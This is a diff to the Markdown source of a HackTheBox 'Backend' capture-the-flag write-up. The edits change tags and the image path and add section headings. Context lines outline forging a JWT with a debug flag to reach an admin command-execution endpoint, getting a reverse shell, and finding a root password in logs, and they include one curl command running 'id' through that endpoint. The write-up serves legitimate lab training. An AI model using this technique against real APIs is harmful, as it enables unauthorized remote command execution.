@@ -2,8 +2,8 @@
 title: HackTheBox - Backend
 date: 2022-08-15 21:00:00 +0800
 categories: [HackTheBox, Medium]
-tags: [api]
-img_path: /assets/img/machine/backend/
+tags: [api, uvicorn]
+img_path: /assets/img/machines/backend/
 ---
 
 Backend is a machine that focuses on exploiting an `API`, the goal is to enumerate to find the swagger documentation, then gain access as admin to later modify the token to activate a debug flag to be able to call an endpoint that allows us to execute commands. Through this endpoint we obtain a shell to later escalate to root. The escalation is simple, in one of the access logs we can see the password of the root user which seems to be that he put unintentionally instead of the user name.
@@ -430,6 +430,10 @@ class Settings(BaseSettings):
 settings = Settings()
 ```
 
+## Shell as user
+
+### Craft JWT with debug variable
+
 Now we have everything we need to create our custom JWT and add our `debug` variable in it.
 
 ```python
@@ -451,6 +455,8 @@ $ curl -s 'http://10.129.227.148/api/v1/admin/exec/id' -H 'Authorization: Bearer
 "uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
 ```
 {: .nolineno }
+
+### Exec reverse shell
 
 Great! now we just have to get a reverse shell, not all of them are valid but after some trial and error this one works perfectly:
 
